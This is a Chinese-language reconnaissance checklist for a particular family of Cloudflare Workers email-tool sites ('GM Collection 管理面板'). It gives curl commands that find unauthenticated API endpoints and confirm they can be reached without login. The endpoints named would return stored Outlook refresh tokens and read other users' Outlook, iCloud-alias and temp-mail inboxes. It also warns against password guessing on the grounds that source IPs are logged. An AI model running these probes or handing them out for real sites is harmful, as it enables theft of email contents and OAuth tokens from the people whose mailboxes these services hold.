# 「GM Collection 管理面板」类邮件工具站 —— 免登录开放接口探测清单
# 适用特征：登录页标题含「GM Collection 管理面板」，提示「请输入在 Wrangler 环境变量中配置的站点账号密码」，
#          并在页面列出「无需登录的开放功能」按钮组（Cloudflare Workers 部署）。
# 前置：本机若启用了 HTTP 代理，curl 必须加 --noproxy "*"，否则拿到代理页导致结论全错。

B=https://<TARGET_HOST>
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36'

# 步骤 1：定位登录页与开放功能清单（未认证）
curl.exe -k -sS --noproxy "*" -m 25 -A "$UA" "$B/"            # 期望 302 -> /login
curl.exe -k -sS --noproxy "*" -m 25 -A "$UA" "$B/login"       # 抓 HTML，grep "/tools/" 取开放功能
# 典型开放功能页（均未认证 200）：
#   /tools/outlook-mail  /tools/icloud-alias-mail  /tools/temp-mail  /tools/chatgpt-converter

# 步骤 2：从工具页源码提取接口（这些页面是内联 JS，直接 grep fetch('/api/...')）
curl.exe -k -sS --noproxy "*" -m 25 -o outlook.html "$B/tools/outlook-mail"
# 已知接口与请求体（只读语义，逐个单发，勿批量）：
#   POST /api/outlook/remote-token   {"email":"<邮箱>"}                      → 取回该邮箱缓存的 clientId + refreshToken
#   POST /api/outlook/emails         {"access_token","email","folder","top","skip","search"}
#   POST /api/outlook/email-detail   {"access_token","email","folder","message_id"}
#   POST /api/outlook/refresh        {"client_id","refresh_token","email"}   ← 写语义，勿发
#   POST /api/open/icloud/alias/emails {"alias_email","apple_id","top","skip"} → 读 iCloud 隐藏邮箱邮件列表
#   POST /api/open/temp-mail/inbox     {"code","top","skip"}                   → 读临时邮箱收件箱
#   POST /api/open/temp-mail/redeem    {"code","username"}                     ← 写语义，勿发

# 步骤 3：只读语义验证（判断接口是「未认证」还是「需登录」）
curl.exe -k -sS --noproxy "*" -m 25 -X POST -H 'Content-Type: application/json' -A "$UA" \
  --data-binary '{"email":"probe-nonexistent@outlook.com"}' "$B/api/outlook/remote-token"
curl.exe -k -sS --noproxy "*" -m 25 -X POST -H 'Content-Type: application/json' -A "$UA" \
  --data-binary '{"alias_email":"user@example.com","top":5,"skip":0}' "$B/api/open/icloud/alias/emails"
curl.exe -k -sS --noproxy "*" -m 25 -X POST -H 'Content-Type: application/json' -A "$UA" \
  --data-binary '{"code":"PROBE0000","top":5,"skip":0}' "$B/api/open/temp-mail/inbox"

# 步骤 4：对照组（证明鉴权中间件本身正常，故未认证可达属设计缺陷而非绕过）
curl.exe -k -sS --noproxy "*" -m 25 -o /dev/null -w '%{http_code}\n' "$B/api/auth/me"   # 期望 401

# 判读：返回业务错误体（"远程 DB 中无缓存数据" / "未找到 alias_email 对应的 Apple ID" / "兑换码不存在"）
#       而非 401 ⇒ 接口未认证可达。要拿到数据还需一个「目标侧已存在的邮箱地址 / Apple ID / 兑换码」。
# 禁止：不要在登录页做口令尝试（Cloudflare Worker，来源 IP 会被记录）；不要发 refresh / redeem 等写语义请求。